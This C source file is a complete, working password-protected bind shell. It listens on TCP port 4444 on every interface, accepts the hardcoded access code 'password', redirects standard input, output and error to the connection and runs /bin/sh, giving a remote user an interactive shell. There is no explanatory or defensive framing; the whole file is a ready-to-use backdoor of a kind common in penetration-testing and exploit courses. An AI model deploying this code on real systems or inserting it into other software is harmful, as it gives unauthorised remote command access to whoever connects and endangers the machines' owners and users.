#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <error.h>
#include <strings.h>
#include <unistd.h>
#include <arpa/inet.h>


main(int argc, char **argv)
{
	struct sockaddr_in server;
	struct sockaddr_in client;
	int sock;
	int new;
	int sockaddr_len = sizeof(struct sockaddr_in);
	char *arguments[] = { "/bin/sh", 0 };

	// Create the server socket
	if((sock = socket(AF_INET, SOCK_STREAM,  0 )) == -1)
	{
		perror("Server socket: ");
		exit(-1);
	}

	// Populate the port information
	server.sin_family = AF_INET;
	server.sin_port = htons(4444);
	server.sin_addr.s_addr = INADDR_ANY;
	bzero(&server.sin_zero, 8);

	// Bind the port
	if((bind(sock, (struct sockaddr *)&server, sockaddr_len)) == -1)
	{
		perror("Bind: ");
		exit(-1);
	}

	// Start listening for incoming connections
	if((listen(sock, 2)) == -1)
	{
		perror("Listen: ");
		exit(-1);
	}

	// Accept a request and spawn a new socket for the connection
	if((new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)) == -1)
	{
		perror("Accept: ");
		exit(-1);	
	}

	// Kill the server
	close(sock);

	// Request a passphrase
	send(new, (char*)"Enter Access Code: ", 20, 0);
	char in[100];
	bzero(in, 99);
	read(new, in, 99);

	// Validate the passphrase
	if(strcmp(in, "password\n") != 0)
	{
		send(new, (char*)"Goodbye\n", 8, 0);
		close(new);
		perror("Auth: ");
		exit(-1);
	}
	else
	{
		send(new, (char*)"Welcome\n", 8, 0);
	}

	// Redirect file descriptors to new socket
	dup2(new, 0); // STDIN
	dup2(new, 1); // STDOUT
	dup2(new, 2); // STDERR

	// Start a shell
	execve(arguments[0], &arguments[0], NULL);

	// Close the socket
	close(new);
}
